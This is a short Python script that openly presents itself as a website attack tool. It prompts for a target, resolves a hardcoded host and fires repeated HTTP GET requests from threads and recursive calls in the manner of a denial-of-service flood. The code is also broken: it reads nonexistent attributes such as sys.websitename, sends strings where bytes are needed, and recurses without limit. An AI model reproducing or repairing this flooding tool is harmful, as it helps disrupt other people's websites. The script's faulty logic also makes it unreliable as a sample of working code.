import socket, sys, threading, time
argv = {1,2,3}
websitename = input('Enter the Website to attack:')
website = socket.gethostbyname("www.coolnishant.github.io")

print(website)

tosend="Hello"
print ("][ Attacking " + websitename  + " ... ][")
print ("injecting " + tosend)
global level  
level= 2
def attack():  
    #pid = os.fork()  
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.connect((sys.websitename, 80))
        print (">> GET /" + sys.tosend + " HTTP/1.1")
        s.send("GET /" + sys.tosend + " HTTP/1.1\r\n")
        s.close()
    except:
        print(">> Socket Dead.")
    for x in range(1, 2000):
        time.sleep(0.009) #So it doesnt break after going to fast        
        attack()
def threader():
    global threads
    threads=[]
    for i in range(1, int(level)):
        t=threading.Thread(target=attack)
        threads.append(t)
        t.start()
threader()